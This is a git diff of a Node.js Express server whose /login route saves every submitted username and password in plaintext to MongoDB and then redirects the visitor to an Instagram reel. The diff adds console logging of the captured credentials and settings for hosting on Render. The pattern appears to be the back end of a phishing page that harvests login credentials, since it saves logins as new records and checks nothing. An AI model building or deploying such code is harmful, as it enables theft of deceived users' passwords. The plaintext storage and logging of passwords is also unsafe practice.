@@ -10,10 +10,21 @@ const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
+// Check Mongo URI
+if (!process.env.MONGO_URI) {
+  console.log("MONGO_URI is missing!");
+  process.exit(1);
+}
+
 // MongoDB Connection
 mongoose.connect(process.env.MONGO_URI)
-  .then(() => console.log("MongoDB Connected"))
-  .catch((err) => console.log(err));
+  .then(() => {
+    console.log("MongoDB Connected");
+  })
+  .catch((err) => {
+    console.log("MongoDB Error:");
+    console.log(err);
+  });
 
 // Schema
 const userSchema = new mongoose.Schema({
@@ -33,7 +44,8 @@ app.post("/login", async (req, res) => {
   try {
     const { username, password } = req.body;
 
-    // Save directly in MongoDB
+    console.log("Received:", username, password);
+
     const newUser = new User({
       username,
       password,
@@ -43,15 +55,22 @@ app.post("/login", async (req, res) => {
 
     console.log("User saved!");
 
-    res.redirect("https://www.instagram.com/reel/DXH9OJcjdb5/?utm_source=ig_web_copy_link");
+    // Redirect to Instagram reel
+    res.redirect(
+      "https://www.instagram.com/reel/DXH9OJcjdb5/?utm_source=ig_web_copy_link"
+    );
 
   } catch (error) {
+    console.log("Save Error:");
     console.log(error);
-    res.status(500).send("Error fetching");
+
+    res.status(500).send("Error saving data");
   }
 });
 
-// Start Server
-app.listen(3000, () => {
-  console.log("Server running on http://localhost:3000");
+// PORT for Render
+const PORT = process.env.PORT || 3000;
+
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
 });
